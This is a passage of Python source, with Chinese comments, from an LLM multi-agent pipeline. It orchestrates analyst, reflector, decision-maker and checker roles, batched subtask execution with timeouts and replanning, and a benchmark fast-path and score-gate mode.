                    self._record_trace("subtask_error", detail=f"{exc}")
                    renderer.console.print(
                        f"  [dim red]✗ 失败[/] [dim]({elapsed:.0f}ms)[/]: {exc}"
                    )
                    self._print_subtask_status(
                        idx,
                        role_str,
                        desc,
                        "fail",
                        detail=str(exc)[:80],
                    )
                    round_results.append(f"## [{role_str}] {desc}\n❌ 失败: {exc}")

                self._emit_compression_notice()
                if self._benchmark_stop_if_terminal("fast_subtask_end"):
                    circuit_broken = True
                    break

            all_results.append(round_results)
            if circuit_broken:
                break

            benchmark_directive = self._update_benchmark_stale_state(round_results)
            if benchmark_directive:
                self._benchmark_forced_directive = benchmark_directive
                renderer.console.print(
                    "  [dim yellow]Benchmark stale detector 已触发，下一轮 close 并切题。[/]"
                )

        if switch_to_standard:
            self._record_trace(
                "benchmark_fast_path_handoff",
                detail="policy fast path 已结束，切回四柱管线处理剩余题目。",
                metadata=self._benchmark_score_status(),
            )
            return True

        renderer.console.print()
        renderer.console.print("[dim bold]📊 Benchmark fast path 执行完成[/]")
        benchmark_summary = self._benchmark_final_summary()
        if all_results:
            self._final_summary = self._build_execution_summary(all_results, iteration)
            if benchmark_summary:
                self._final_summary += benchmark_summary
            renderer.print_markdown(self._final_summary)
        elif benchmark_summary:
            self._final_summary = benchmark_summary.lstrip()
            renderer.print_markdown(self._final_summary)
        return False

    def _run_phases(self, user_input: str, auto_decision: bool) -> None:
        """管线主逻辑，含超时保护和熔断机制。"""
        renderer = self._renderer
        if self._is_benchmark_aggressive():
            if not self._run_benchmark_fast_phases(user_input):
                return

        # ── Phase 1: 四柱思考 ──
        renderer.console.print()
        renderer.console.print("[dim bold]🧠 四柱思考阶段[/]")
        renderer.console.print("[dim]分析为底 → 扩展为路 → 迁跃为辅 → 反思为主[/]")

        def _is_role_error(result: str) -> bool:
            """检测角色 LLM 是否返回了错误/超时文本而非有效分析。"""
            return "调用失败" in result or "调用超时" in result

        def _role_abort_warning(role_label: str) -> str:
            return (
                f"⚠️ {role_label} 执行异常，后续角色将基于有限信息继续。"
            )

        phase1_failed = False

        # 1. 分析者（底）
        renderer.console.print("  [dim]⏳ 分析者 正在深度分析...[/]")
        self._record_role_progress(
            "analyst",
            "分析者",
            "start",
            action="正在深度分析",
            phase="thinking",
        )
        t0 = time_mod.monotonic()
        analysis = self._call_role_with_timeout(AgentRole.ANALYST, user_input)
        elapsed_ms = (time_mod.monotonic() - t0) * 1000
        if _is_role_error(analysis):
            renderer.console.print(f"  [bold red]✗ 分析者 异常 ({elapsed_ms:.0f}ms): {analysis[:100]}[/]")
            phase1_failed = True
            self._record_role_progress(
                "analyst",
                "分析者",
                "error",
                detail=analysis[:500],
                elapsed_ms=elapsed_ms,
                phase="thinking",
            )
        else:
            renderer.console.print(f"  [dim green]✓ 分析者 完成[/] [dim]({elapsed_ms:.0f}ms)[/]")
            renderer.console.print(f"  [dim]{analysis[:200].replace(chr(10), ' ')}...[/]")
            self._record_role_progress(
                "analyst",
                "分析者",
                "done",
                detail=analysis[:500],
                elapsed_ms=elapsed_ms,
                phase="thinking",
            )
        self._record_trace("role_analyst", detail=analysis[:1000])

        # 2. 扩散者（路）
        renderer.console.print("  [dim]⏳ 扩散者 正在探索路径...[/]")
        self._record_role_progress(
            "diffuser",
            "扩散者",
            "start",
            action="正在探索路径",
            phase="thinking",
        )
        t0 = time_mod.monotonic()
        ctx_for_diffuser = (
            f"## 分析结论\n{analysis}"
            if not _is_role_error(analysis)
            else _role_abort_warning("分析者")
        )
        diffusion = self._call_role_with_timeout(
            AgentRole.DIFFUSER, user_input,
            context=ctx_for_diffuser,
        )
        elapsed_ms = (time_mod.monotonic() - t0) * 1000
        if _is_role_error(diffusion):
            renderer.console.print(f"  [bold red]✗ 扩散者 异常 ({elapsed_ms:.0f}ms): {diffusion[:100]}[/]")
            phase1_failed = True
            self._record_role_progress(
                "diffuser",
                "扩散者",
                "error",
                detail=diffusion[:500],
                elapsed_ms=elapsed_ms,
                phase="thinking",
            )
        else:
            renderer.console.print(f"  [dim green]✓ 扩散者 完成[/] [dim]({elapsed_ms:.0f}ms)[/]")
            self._record_role_progress(
                "diffuser",
                "扩散者",
                "done",
                detail=diffusion[:500],
                elapsed_ms=elapsed_ms,
                phase="thinking",
            )
        self._record_trace("role_diffuser", detail=diffusion[:1000])

        # 3. 迁跃者（辅）
        renderer.console.print("  [dim]⏳ 迁跃者 正在创造性跨越...[/]")
        self._record_role_progress(
            "jumper",
            "迁跃者",
            "start",
            action="正在创造性跨越",
            phase="thinking",
        )
        t0 = time_mod.monotonic()
        analysis_ok = not _is_role_error(analysis)
        diffusion_ok = not _is_role_error(diffusion)
        if analysis_ok and diffusion_ok:
            ctx_for_jumper = f"## 分析者\n{analysis}\n\n## 扩散者\n{diffusion}"
        elif analysis_ok:
            ctx_for_jumper = f"## 分析者\n{analysis}\n\n" + _role_abort_warning("扩散者")
        else:
            ctx_for_jumper = _role_abort_warning("分析者/扩散者")
        jump = self._call_role_with_timeout(
            AgentRole.JUMPER, user_input,
            context=ctx_for_jumper,
        )
        elapsed_ms = (time_mod.monotonic() - t0) * 1000
        if _is_role_error(jump):
            renderer.console.print(f"  [bold red]✗ 迁跃者 异常 ({elapsed_ms:.0f}ms): {jump[:100]}[/]")
            phase1_failed = True
            self._record_role_progress(
                "jumper",
                "迁跃者",
                "error",
                detail=jump[:500],
                elapsed_ms=elapsed_ms,
                phase="thinking",
            )
        else:
            renderer.console.print(f"  [dim green]✓ 迁跃者 完成[/] [dim]({elapsed_ms:.0f}ms)[/]")
            self._record_role_progress(
                "jumper",
                "迁跃者",
                "done",
                detail=jump[:500],
                elapsed_ms=elapsed_ms,
                phase="thinking",
            )
        self._record_trace("role_jumper", detail=jump[:1000])

        # 4. 反思者（主）—— 综合审视 + 制定执行计划
        renderer.console.print("  [dim]⏳ 反思者 正在综合审视...[/]")
        self._record_role_progress(
            "reflector",
            "反思者",
            "start",
            action="正在综合审视",
            phase="thinking",
        )
        t0 = time_mod.monotonic()
        # 构建反思者上下文，跳过已失败的角色输出
        reflector_parts = []
        if not _is_role_error(analysis):
            reflector_parts.append(f"## 分析者（分析为底）\n{analysis}")
        if not _is_role_error(diffusion):
            reflector_parts.append(f"## 扩散者（扩展为路）\n{diffusion}")
        if not _is_role_error(jump):
            reflector_parts.append(f"## 迁跃者（迁跃为辅）\n{jump}")
        reflector_context = (
            "\n\n".join(reflector_parts)
            if reflector_parts
            else "所有前置角色均执行异常，请基于用户原始需求直接输出执行计划。"
        )
        reflection = self._call_role_with_timeout(
            AgentRole.REFLECTOR, user_input,
            context=reflector_context,
            extra_instruction=(
                "请综合以上三个角色的输出，做出最终判断。"
                "输出执行计划时要具体、可操作，每个子任务分配明确的执行角色（runner/reader/builder）。"
                + self._aggressive_planning_instruction()
            ),
        )
        elapsed = (time_mod.monotonic() - t0) * 1000
        if _is_role_error(reflection):
            renderer.console.print(f"  [bold red]✗ 反思者 异常 ({elapsed:.0f}ms): {reflection[:100]}[/]")
            phase1_failed = True
            self._record_role_progress(
                "reflector",
                "反思者",
                "error",
                detail=reflection[:500],
                elapsed_ms=elapsed,
                phase="thinking",
            )
        else:
            renderer.console.print(f"  [dim green]✓ 反思者 完成[/] [dim]({elapsed:.0f}ms)[/]")
            self._record_role_progress(
                "reflector",
                "反思者",
                "done",
                detail=reflection[:500],
                elapsed_ms=elapsed,
                phase="thinking",
            )

        if phase1_failed:
            renderer.console.print()
            renderer.console.print(
                "  [bold yellow]⚠️ 四柱思考阶段存在角色异常，"
                "管线将继续尝试但输出质量可能下降。[/]"
            )

        # 展示反思者输出（摘要形式）
        if not _is_role_error(reflection):
            renderer.console.print()
            renderer.console.print("[dim bold]📋 反思者审视结论（摘要）[/]")
            renderer.console.print(
                f"  [dim]{reflection[:500].replace(chr(10), ' ')}...[/]"
            )
        self._record_trace("role_reflector", detail=reflection[:1000])

        # ── Phase 2: 执行循环（反思闭环）──
        max_iterations_per_batch = self._resolve_effective_max_iterations()
        max_iterations = (
            max_iterations_per_batch * BENCHMARK_MAX_ITERATION_BATCHES
            if self._is_benchmark_aggressive()
            else max_iterations_per_batch
        )
        all_results: list[list[str]] = []
        iteration = 0  # 在循环外声明，供 Phase 3 引用

        for iteration in range(1, max_iterations + 1):
            if (
                self._is_benchmark_aggressive()
                and iteration > 1
                and (iteration - 1) % max_iterations_per_batch == 0
            ):
                if not self._benchmark_should_continue_iteration_batches(
                    source="four_pillar",
                    completed_iterations=iteration - 1,
                ):
                    iteration -= 1
                    break
            batch_iteration = ((iteration - 1) % max_iterations_per_batch) + 1
            batch_count = int(
                self._runtime_context.get("_benchmark_iteration_batch_count", 1) or 1
            )
            renderer.console.print()
            if self._is_benchmark_aggressive():
                renderer.console.print(
                    f"[dim bold]⚡ 执行循环 第 {batch_iteration}/{max_iterations_per_batch} 轮"
                    f"（第 {batch_count} 批，总第 {iteration} 轮）[/]"
                )
            else:
                renderer.console.print(
                    f"[dim bold]⚡ 执行循环 第 {iteration}/{max_iterations} 轮[/]"
                )
            self._record_trace("iteration_start", detail=f"第 {iteration} 轮")
            if self._benchmark_stop_if_terminal("iteration_start"):
                self._record_trace("iteration_done", detail=f"第 {iteration} 轮：Benchmark 已终止")
                break

            # 5. 决策者 → 分解子任务
            renderer.console.print("  [dim]⏳ 决策者 正在分解子任务...[/]")
            self._record_role_progress(
                "decision_maker",
                "决策者",
                "start",
                action="正在分解子任务",
                phase="execution",
            )
            iter_context = reflection
            if all_results:
                # 展示最近一轮执行结果（从按迭代分组的数据中取最后一轮）
                prev_round = all_results[-1]
                iter_context += f"\n\n## 上一轮执行结果\n" + "\n".join(
                    f"- {r[:300]}" for r in prev_round[-5:]
                )
            forced_benchmark_directive = self._consume_benchmark_forced_directive()
            if forced_benchmark_directive:
                iter_context += (
                    "\n\n## Benchmark 强制调度指令\n"
                    f"{forced_benchmark_directive}"
                )
            benchmark_state_context = self._benchmark_state_context()
            if benchmark_state_context:
                iter_context += f"\n\n{benchmark_state_context}"
            plan_json = self._call_role_with_timeout(
                AgentRole.DECISION_MAKER, user_input,
                context=f"## 反思者执行计划\n{iter_context}",
                extra_instruction=(
                    "请把计划分解为可以直接执行的工具子任务，避免生成无谓询问用户的子任务。"
                    + self._aggressive_planning_instruction()
                ),
            )
            self._record_role_progress(
                "decision_maker",
                "决策者",
                "done",
                detail=plan_json[:500],
                phase="execution",
            )
            plan = self._parse_json(plan_json)
            subtasks = plan.get("subtasks", [])
            reasoning = plan.get("reasoning", "")

            handoff_subtasks = self._benchmark_reasoning_handoff_subtasks()
            if handoff_subtasks and not self._benchmark_plan_is_handoff_like(subtasks):
                original_plan_setup_like = self._benchmark_plan_is_setup_like(subtasks)
                subtasks = handoff_subtasks
                setup_note = (
                    "决策者计划偏向 setup，"
                    if original_plan_setup_like
                    else "决策者计划不是当前题专项 handoff，"
                )
                reasoning = (
                    "Benchmark fast path 已完成前置校验并锁定当前 active 题；"
                    f"{setup_note}已替换为当前题 focused 深挖计划。"
                )
                self._record_trace(
                    "benchmark_reasoning_handoff_plan",
                    detail=reasoning,
                    metadata={
                        "original_plan": plan_json[:800],
                        "current": self._benchmark_state_snapshot().get("current_challenge"),
                    },
                )
                renderer.console.print(
                    "  [dim yellow]Benchmark handoff：当前题已有有效线索，"
                    "已替换非专项计划为 focused 深挖计划。[/]"
                )

            if not subtasks:
                benchmark_continue = self._benchmark_target_continue_directive()
                if benchmark_continue:
                    self._benchmark_forced_directive = benchmark_continue
                    if self._benchmark_rate_limit_backoff(
                        "decision_maker_empty_plan",
                        plan_json,
                    ):
                        continue
                    subtasks = self._benchmark_fallback_subtasks()
                    reasoning = (
                        "Benchmark target gate fallback：目标未达成且决策者未返回"
                        "可执行子任务，使用策略驱动调度继续。"
                    )
                    self._record_trace(
                        "benchmark_fallback_plan",
                        detail=reasoning,
                        metadata={
                            "plan_text": plan_json[:500],
                            "score_status": self._benchmark_score_status(),
                        },
                    )
                    renderer.console.print(
                        "  [dim yellow]Benchmark target gate 未达标，"
                        "决策者空计划，已启用策略 fallback 子任务。[/]"
                    )
                else:
                    renderer.console.print("  [dim]决策者未分解出子任务，结束执行。[/]")
                    break

            renderer.console.print(
                f"  [dim green]✓ 决策者 分解出 {len(subtasks)} 个子任务[/]"
            )

            # 6. 选择子任务
            selected_indices = list(range(len(subtasks)))
            additional_context = forced_benchmark_directive
            if benchmark_state_context:
                additional_context = (
                    f"{additional_context}\n\n{benchmark_state_context}"
                    if additional_context
                    else benchmark_state_context
                )

            if auto_decision:
                selected_indices, selected_context = self._auto_select(
                    subtasks, reasoning,
                )
                if selected_context:
                    additional_context = (
                        f"{additional_context}\n{selected_context}"
                        if additional_context
                        else selected_context
                    )
            else:
                selected_indices, selected_context = self._user_select(
                    subtasks, reasoning, iteration,
                )
                if selected_context:
                    additional_context = (
                        f"{additional_context}\n{selected_context}"
                        if additional_context
                        else selected_context
                    )

            selected_indices, selection_note = self._benchmark_normalize_selected_indices(
                subtasks,
                selected_indices,
            )
            if selection_note:
                renderer.console.print(f"  [dim yellow]↻ {selection_note}。[/]")
                self._record_trace(
                    "benchmark_handoff_selection_normalized",
                    detail=selection_note,
                    metadata={"subtask_count": len(subtasks)},
                )

            if not selected_indices:
                renderer.console.print("  [dim]未选择任何子任务，结束执行。[/]")
                break

            renderer.console.print(
                f"  [dim]已选择 {len(selected_indices)}/{len(subtasks)} 个子任务[/]"
            )
            self._print_subtask_checklist(
                subtasks,
                selected_indices,
                iteration=iteration,
            )

            # 7. 顺序执行子任务（动态叠加超时 + 熔断 + 超时重规划）
            renderer.console.print()
            base_timeout, timeout_step, max_escalations = self._subtask_timeout_config()
            renderer.console.print(
                f"[dim bold]🔧 执行 {len(selected_indices)} 个子任务[/]"
                f" [dim](超时={base_timeout}s"
                f"+{max_escalations}×{timeout_step}s,"
                f" 熔断={CIRCUIT_BREAKER_CONSECUTIVE_FAILS},"
                f" 并发={self._resolve_subtask_concurrency()},"
                f" max_subagents={self._resolve_max_subagents()})[/]"
            )
            self._record_trace(
                "subtask_scheduler_config",
                detail=(
                    f"strategy={self._resolve_subtask_concurrency()}, "
                    f"max_subagents={self._resolve_max_subagents()}"
                ),
                metadata={
                    "strategy": self._resolve_subtask_concurrency(),
                    "max_subagents": self._resolve_max_subagents(),
                },
            )

            round_results: list[str] = []
            circuit_broken = False

            # ── 批量执行：顺序 + 并行混合 ──
            # 连续标记 parallel=true 的子任务合并为一个并行批次；
            # 未标记或 parallel=false 的子任务仍顺序执行。
            batch_i = 0
            while batch_i < len(selected_indices):
                idx = selected_indices[batch_i]
                if idx >= len(subtasks):
                    batch_i += 1
                    continue

                # 每批次前检查熔断器
                try:
                    self._check_circuit_breaker()
                except PipelineCircuitBreakerError as exc:
                    renderer.console.print(
                        f"  [bold red]⛔ {exc}[/]"
                    )
                    circuit_broken = True
                    break

                task = subtasks[idx]
                is_parallel, parallel_reason = self._subtask_parallel_decision(task)

                if is_parallel:
                    # 收集连续且资源不冲突的候选子任务形成一个并行批次。
                    parallel_batch: list[dict] = []
                    batch_resource_keys: set[str] = set()
                    max_subagents = self._resolve_max_subagents()
                    while batch_i < len(selected_indices):
                        pidx = selected_indices[batch_i]
                        if pidx >= len(subtasks):
                            batch_i += 1
                            continue
                        ptask = subtasks[pidx]
                        can_parallel, reason = self._subtask_parallel_decision(ptask)
                        if not can_parallel:
                            self._record_trace(
                                "subtask_parallel_rejected",
                                detail=str(ptask.get("task_description", str(ptask)))[:200],
                                metadata={
                                    "index": pidx,
                                    "reason": reason,
                                },
                            )
                            break
                        resource_keys = self._extract_subtask_resource_keys(ptask)
                        conflicting_keys = sorted(batch_resource_keys & resource_keys)
                        if conflicting_keys:
                            self._record_trace(
                                "subtask_parallel_rejected",
                                detail=str(ptask.get("task_description", str(ptask)))[:200],
                                metadata={
                                    "index": pidx,
                                    "reason": "resource_conflict",
                                    "resource_keys": sorted(resource_keys),
                                    "conflicting_keys": conflicting_keys,
                                },
                            )
                            break
                        if len(parallel_batch) >= max_subagents:
                            self._record_trace(
                                "subtask_parallel_rejected",
                                detail=str(ptask.get("task_description", str(ptask)))[:200],
                                metadata={
                                    "index": pidx,
                                    "reason": "max_subagents_reached",
                                    "max_subagents": max_subagents,
                                },
                            )
                            break
                        ptask_with_index = dict(ptask)
                        ptask_with_index["_task_index"] = pidx
                        ptask_with_index["_resource_keys"] = sorted(resource_keys)
                        ptask_with_index["_parallel_reason"] = reason
                        parallel_batch.append(ptask_with_index)
                        batch_resource_keys.update(resource_keys)
                        self._print_subtask_status(
                            pidx,
                            str(ptask.get("role", "runner")),
                            str(ptask.get("task_description", str(ptask))),
                            "start",
                            parallel=True,
                        )
                        batch_i += 1

                    if not parallel_batch:
                        self._record_trace(
                            "subtask_parallel_rejected",
                            detail=str(task.get("task_description", str(task)))[:200],
                            metadata={
                                "index": idx,
                                "reason": parallel_reason,
                            },
                        )
                        continue

                    batch_results = self._run_parallel_batch(
                        parallel_batch,
                        user_input=user_input,
                        reasoning=reasoning,
                        additional_context=additional_context,
                    )
                    round_results.extend(batch_results)
                    if self._benchmark_stop_if_terminal("parallel_batch_end"):
                        circuit_broken = True
                        break
                else:
                    # 顺序执行单条子任务（保持原有行为）
                    role_str = task.get("role", "runner")
                    desc = task.get("task_description", str(task))
                    ctx = task.get("context", "")
                    if additional_context:
                        ctx = f"{ctx}\n补充: {additional_context}" if ctx else additional_context

                    renderer.console.print(
                        f"  [dim]── [{role_str}] {desc[:80]}...[/]"
                    )
                    self._print_subtask_status(
                        idx,
                        role_str,
                        desc,
                        "start",
                    )
                    start = time_mod.monotonic()
                    self._record_trace(
                        "subtask_start",
                        detail=f"[{role_str}] {desc[:200]}",
                    )

                    deterministic_result: str | None = None
                    if "Benchmark handoff step" in desc or self._benchmark_service_action_from_desc(str(desc)):
                        try:
                            deterministic_result = self._benchmark_deterministic_fast_step(
                                desc,
                                reason="deterministic_handoff",
                            )
                        except Exception as exc:
                            self._record_trace(
                                "benchmark_deterministic_handoff_failed",
                                detail=str(exc),
                                metadata={"desc": desc[:200]},
                            )
                            deterministic_result = None
                    elif self._is_benchmark_aggressive():
                        try:
                            deterministic_result = self._benchmark_deterministic_standard_task(desc)
                        except Exception as exc:
                            self._record_trace(
                                "benchmark_deterministic_standard_failed",
                                detail=str(exc),
                                metadata={"desc": desc[:200]},
                            )
                            deterministic_result = None
                    if deterministic_result is not None:
                        elapsed = (time_mod.monotonic() - start) * 1000
                        renderer.console.print(
                            f"  [dim green]✓ 确定性 Benchmark 步骤完成[/] [dim]({elapsed:.0f}ms)[/]"
                        )
                        result_head = self._benchmark_result_head(deterministic_result)
                        if result_head:
                            renderer.console.print(f"    [dim]{result_head}[/]")
                        self._print_subtask_status(
                            idx,
                            role_str,
                            desc,
                            "done",
                            detail=f"deterministic {elapsed:.0f}ms",
                        )
                        self._record_trace(
                            "benchmark_deterministic_handoff_step",
                            detail=deterministic_result[:1000],
                        )
                        round_results.append(f"## [{role_str}] {desc}\n{deterministic_result}")
                        self._consecutive_failures = 0
                        self._benchmark_reset_setup_timeout_streak()
                        if self._benchmark_stop_if_terminal("handoff_deterministic_step_end"):
                            circuit_broken = True
                            break
                        pause_generic, pause_reason = (
                            self._benchmark_should_pause_generic_plan_after_deterministic(
                                desc
                            )
                        )
                        if pause_generic:
                            renderer.console.print(
                                f"  [dim yellow]↻ {pause_reason}。[/]"
                            )
                            self._record_trace(
                                "benchmark_pause_generic_plan_for_handoff",
                                detail=pause_reason,
                                metadata={"desc": desc[:200]},
                            )
                            break
                        batch_i += 1
                        continue

                    subtask_prompt = self._build_subtask_prompt(
                        role_str,
                        desc,
                        ctx=ctx,
                        reasoning=reasoning,
                        aggressive=self._is_aggressive_execution(),
                        benchmark_profile=self._resolve_benchmark_profile(),
                        benchmark_state_context=self._benchmark_state_context(),
                    )

                    try:
                        result = self._run_subtask_with_escalating_timeout(
                            subtask_prompt, get_role_label(self._str_to_role(role_str)), desc,
                        )
                        elapsed = (time_mod.monotonic() - start) * 1000
                        renderer.console.print(
                            f"  [dim green]✓ 完成[/] [dim]({elapsed:.0f}ms, {len(result)}字)[/]"
                        )
                        self._print_subtask_status(
                            idx,
                            role_str,
                            desc,
                            "done",
                            detail=f"{elapsed:.0f}ms, {len(result)}字",
                        )
                        self._record_trace("subtask_complete", detail=result[:500])
                        round_results.append(
                            f"## [{role_str}] {desc}\n{result}"
                        )
                        self._consecutive_failures = 0
                        self._benchmark_reset_setup_timeout_streak()

                    except TimeoutError as exc:
                        elapsed = (time_mod.monotonic() - start) * 1000
                        self._consecutive_failures += 1
                        self._record_trace("subtask_timeout", detail=str(exc))
                        renderer.console.print(
                            f"  [dim red]⏰ 全部叠加超时[/] [dim]({elapsed:.0f}ms)[/]"
                        )
                        self._print_subtask_status(
                            idx,
                            role_str,
                            desc,
                            "fail",
                            detail=f"超时 {elapsed:.0f}ms",
                        )
                        if self._is_benchmark_aggressive():
                            setup_stop_reason = self._benchmark_setup_timeout_stop_reason(
                                str(exc)
                            )
                            if setup_stop_reason:
                                renderer.console.print(
                                    f"  [bold red]⛔ {setup_stop_reason}[/]"
                                )
                                round_results.append(
                                    f"## [{role_str}] {desc}\n❌ {setup_stop_reason}"
                                )
                                circuit_broken = True
                                break
                            timeout_directive = self._benchmark_timeout_directive(str(exc))
                            if timeout_directive:
                                self._benchmark_forced_directive = timeout_directive
                                renderer.console.print(
                                    "  [dim yellow]Benchmark 子任务超时，"
                                    "下一轮将强制 close 当前题并换题。[/]"
                                )
                            # Benchmark aggressive 的 180s 超时是预期内止损信号，
                            # 不应累计为管线熔断失败。
                            self._consecutive_failures = 0
                            round_results.append(
                                f"## [{role_str}] {desc}\n❌ Benchmark 子任务超时，"
                                f"已触发止损换题: {exc}"
                            )
                            batch_i += 1
                            continue
                        # 重规划：让决策者将此子任务拆分为更小粒度的子任务
                        replanned = self._replan_single_task(
                            desc, exc, user_input, reasoning,
                        )
                        if replanned:
                            renderer.console.print(
                                f"  [dim yellow]↻ 已重规划为 {len(replanned)} 个更小粒度的子任务，尝试执行...[/]"
                            )
                            for rt in replanned:
                                rstart = time_mod.monotonic()
                                try:
                                    rt_result = self._run_subtask_with_escalating_timeout(
                                        rt["prompt"], rt["label"], rt["desc"],
                                    )
                                    r_elapsed = (time_mod.monotonic() - rstart) * 1000
                                    renderer.console.print(
                                        f"    [dim green]✓ 重规划子任务完成[/] [dim]({r_elapsed:.0f}ms)[/]"
                                    )
                                    round_results.append(
                                        f"## [重规划] {rt['desc']}\n{rt_result}"
                                    )
                                    self._consecutive_failures = 0
                                except (TimeoutError, Exception) as r_exc:
                                    self._consecutive_failures += 1
                                    renderer.console.print(
                                        f"    [dim red]✗ 重规划子任务失败[/]: {r_exc}"
                                    )
                                    round_results.append(
                                        f"## [重规划] {rt['desc']}\n❌ 失败: {r_exc}"
                                    )
                        else:
                            renderer.console.print(
                                f"  [dim]重规划失败，记录原始错误。[/]"
                            )
                            round_results.append(
                                f"## [{role_str}] {desc}\n❌ 全部超时叠加后重规划也失败: {exc}"
                            )

                    except Exception as exc:
                        elapsed = (time_mod.monotonic() - start) * 1000
                        if self._benchmark_rate_limit_backoff(
                            f"benchmark_subtask_{idx}",
                            str(exc),
                        ):
                            round_results.append(
                                f"## [{role_str}] {desc}\n⚠️ 临时模型/API 异常，已退避后继续。"
                            )
                            batch_i += 1
                            continue
                        self._consecutive_failures += 1
                        self._record_trace("subtask_error", detail=f"{exc}")
                        renderer.console.print(
                            f"  [dim red]✗ 失败[/] [dim]({elapsed:.0f}ms)[/]: {exc}"
                        )
                        self._print_subtask_status(
                            idx,
                            role_str,
                            desc,
                            "fail",
                            detail=str(exc)[:80],
                        )
                        round_results.append(
                            f"## [{role_str}] {desc}\n❌ 失败: {exc}"
                        )

                    # ── 上下文压缩通知 ──
                    self._emit_compression_notice()

                    if self._benchmark_stop_if_terminal("subtask_end"):
                        circuit_broken = True
                        break

                    batch_i += 1

            all_results.append(round_results)
            if circuit_broken:
                break
            benchmark_directive = self._update_benchmark_stale_state(round_results)
            if benchmark_directive:
                self._benchmark_forced_directive = benchmark_directive
                renderer.console.print(
                    "  [dim yellow]Benchmark stale detector 已触发，"
                    "下一轮将强制 close 当前题并切换下一题。[/]"
                )

            # 8. 审计者验证
            renderer.console.print("  [dim]⏳ 审计者 正在验证结果...[/]")
            self._record_role_progress(
                "checker",
                "审计者",
                "start",
                action="正在验证结果",
                phase="execution",
            )
            check = self._call_role_with_timeout(
                AgentRole.CHECKER, user_input,
                context=(
                    f"## 执行计划\n{plan_json[:1000]}\n\n"
                    f"## 执行结果\n" + "\n---\n".join(
                        r[:800] for r in round_results
                    )
                ),
            )
            renderer.console.print("  [dim green]✓ 审计者 完成[/]")
            self._record_role_progress(
                "checker",
                "审计者",
                "done",
                detail=check[:500],
                phase="execution",
            )
            self._record_trace("role_checker", detail=check[:500])

            # 9. 反思者审视 → 决定是否继续迭代
            if (
                iteration < max_iterations
                and (
                    not self._is_benchmark_aggressive()
                    or batch_iteration < max_iterations_per_batch
                )
            ):
                renderer.console.print("  [dim]⏳ 反思者 正在审视是否需要迭代...[/]")
                self._record_role_progress(
                    "reflector",
                    "反思者",
                    "start",
                    action="正在审视是否需要迭代",
                    phase="execution",
                )
                reflection = self._call_role_with_timeout(
                    AgentRole.REFLECTOR, user_input,
                    context=(
                        f"## 本轮执行结果\n" + "\n---\n".join(
                            r[:600] for r in round_results
                        )
                        + f"\n\n## 审计者意见\n{check[:800]}"
                    ),
                    extra_instruction=(
                        "请判断当前结果是否已满足用户需求。"
                        "如果已满足，第一行写「执行完成」。"
                        "如果还需改进，第一行写「继续迭代」，并给出具体改进方向。"
                        + self._aggressive_planning_instruction()
                    ),
                )
                self._record_role_progress(
                    "reflector",
                    "反思者",
                    "done",
                    detail=reflection[:500],
                    phase="execution",
                )
                if (
                    ("执行完成" in reflection and not self._benchmark_forced_directive)
                    or self._consecutive_failures > 0
                ):
                    benchmark_continue = self._benchmark_target_continue_directive()
                    if benchmark_continue:
                        self._consecutive_failures = 0
                        self._benchmark_forced_directive = benchmark_continue
                        self._benchmark_rate_limit_backoff(
                            "reflector_or_round_failure",
                            reflection + "\n" + "\n".join(round_results),
                        )
                        renderer.console.print(
                            "  [dim yellow]Benchmark target gate 未达标，"
                            "覆盖“执行完成”判定并继续迭代。[/]"
                        )
                        self._record_trace(
                            "benchmark_target_gate_continue",
                            detail=benchmark_continue,
                            metadata=self._benchmark_score_status(),
                        )
                        continue
                    # 有失败时不再迭代，直接收尾
                    renderer.console.print(
                        "  [dim green]✓ 反思者判定：执行完成[/]"
                    )
                    self._record_trace("iteration_done", detail=f"第 {iteration} 轮：执行完成")
                    break
                renderer.console.print(
                    "  [dim yellow]↻ 反思者判定：需继续迭代[/]"
                )
                self._record_trace("iteration_continue", detail=f"第 {iteration} 轮：继续迭代")
            else:
                if self._is_benchmark_aggressive() and batch_iteration >= max_iterations_per_batch:
                    renderer.console.print(
                        "  [dim]已达当前批次最大迭代次数，进入 Benchmark 续跑判断。[/]"
                    )
                    self._record_trace(
                        "iteration_batch_done",
                        detail=f"第 {batch_count} 批已达最大迭代次数",
                    )
                else:
                    renderer.console.print(
                        "  [dim]已达最大迭代次数，结束循环。[/]"
                    )
                    self._record_trace("iteration_done", detail=f"已达最大迭代次数")

        # ── Phase 3: 聚合输出 ──
        renderer.console.print()
        renderer.console.print("[dim bold]📊 四柱管线执行完成[/]")

        benchmark_summary = self._benchmark_final_summary()
        if all_results:
            self._final_summary = self._build_execution_summary(all_results, iteration)
            if benchmark_summary:
                self._final_summary += benchmark_summary
            renderer.print_markdown(self._final_summary)
        elif benchmark_summary:
            self._final_summary = benchmark_summary.lstrip()
            renderer.print_markdown(self._final_summary)

    def _emit_compression_notice(self) -> None:
        """检查 runner 最近是否触发了上下文压缩，若有则打印通知。"""
        info = getattr(self._runner, "last_compression_info", None)
        if info:
            self._renderer.console.print(
                f"  [dim yellow]📦 上下文压缩: {info['count']} 条历史消息已压缩"
                f" ({info['method']})，按 Ctrl+B 查看详情[/]"
            )

    # ── 重规划超时子任务 ──
    def _replan_single_task(
        self,
        original_desc: str,
        timeout_exc: TimeoutError,
        user_input: str,
        reasoning: str,
    ) -> list[dict] | None:
        """对超时子任务进行重规划，拆分为更小粒度的子任务。

        让决策者分析失败原因并输出 JSON 格式的更小任务列表。
        """
        renderer = self._renderer
        replan_context = (
            f"## 原始用户任务\n{user_input}\n\n"
            f"## 整体计划\n{reasoning[:500]}\n\n"
            f"## 超时的子任务\n{original_desc}\n\n"
            f"## 超时信息\n{timeout_exc}\n"
        )

        decision = self._call_role_with_timeout(
            AgentRole.DECISION_MAKER, "",
            context=replan_context,
            extra_instruction=(
                "以上子任务因超时未能完成。请将其拆分为 2-3 个更小粒度的子任务，"
                "每个小任务应该更聚焦、更容易在短时间内完成。"
                "\n\n输出必须是 JSON："
                '{"reasoning": "...", "subtasks": ['
                '{"role": "runner", "task_description": "..."}, '
                '{"role": "reader", "task_description": "..."}]}'
            ),
        )
        parsed = self._parse_json(decision)
        raw_tasks = parsed.get("subtasks", [])
        if not raw_tasks:
            return None

        result: list[dict] = []
        for t in raw_tasks:
            desc = t.get("task_description", str(t))
            role = t.get("role", "runner")
            result.append({
                "desc": desc,
                "prompt": (
                    f"你是{get_role_label(self._str_to_role(role))}。"
                    f"这是拆分后的小任务，请只做这一件事，完成后给出结果摘要。\n\n"
                    f"子任务: {desc}\n"
                    f"\n整体背景: {reasoning[:300]}\n"
                    f"\n请直接调用工具完成此子任务，给出核心结果。"
                ),
                "label": get_role_label(self._str_to_role(role)),
            })
        return result

    # ── 子任务选择 ──
    def _auto_select(
